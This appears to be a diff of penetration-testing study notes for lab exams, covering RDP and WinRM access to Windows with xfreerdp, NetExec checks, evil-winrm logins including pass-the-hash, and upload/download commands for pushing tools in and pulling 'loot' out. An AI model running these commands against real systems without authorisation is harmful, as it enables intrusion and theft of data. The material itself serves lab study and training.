@@ -14,10 +14,11 @@ Both = **credentialed remote access to Windows**. You have valid creds → which
 ## RDP (3389) — GUI
 
 ```bash
+# [Kali] opens a desktop window of the target
 xfreerdp /v:<IP> /u:<user> /p:<password> /cert:ignore +clipboard
 ```
 - `/cert:ignore` → skip cert errors
-- `+clipboard` → copy/paste files & commands
+- `+clipboard` → copy/paste files & text between Kali and the desktop
 
 ---
 
@@ -25,30 +26,39 @@ xfreerdp /v:<IP> /u:<user> /p:<password> /cert:ignore +clipboard
 
 **1. Check access first** (don't blind-connect):
 ```bash
+# [Kali]
 nxc winrm <IP> -u <user> -p <password>
 ```
-- `[+] user:pass` → valid creds, **no shell** (not in Remote Management Users)
+- `[+] user:pass` → valid creds, **no shell** (user isn't in Remote Management Users)
 - `[+] user:pass (Pwn3d!)` → **shell available** ✅
 
 **2. Connect:**
 ```bash
+# [Kali]
 evil-winrm -i <IP> -u <user> -p <password>
 ```
 Pass-the-hash (have NTLM, no password):
 ```bash
+# [Kali]
 evil-winrm -i <IP> -u <user> -H <NTLM_HASH>
 ```
 
-**3. Inside the shell:**
+
+---
+
+## ⭐ upload / download inside evil-winrm 
+
+
 ```
-upload /path/local.exe      # Kali → target
-download C:\loot.txt        # target → Kali
+upload   <path-on-KALI>    <path-on-TARGET>     # Kali → Target  (push a tool in)
+download <path-on-TARGET>  <path-on-KALI>       # Target → Kali  (pull loot out)
 ```
-- User flag: `C:\Users\<user>\Desktop\local.txt` (PG: `proof.txt`)
+You can choose to specify a full path from your local machine whether you are uploading or downloading. 
 
 ---
 
 ## Related Notes
+- [[File_Transfer]] — all other transfer methods (HTTP, SMB, nc, base64)
 - [[NetExec]]
 - [[CrackMapExec]]
 - [[Password_Spraying]]
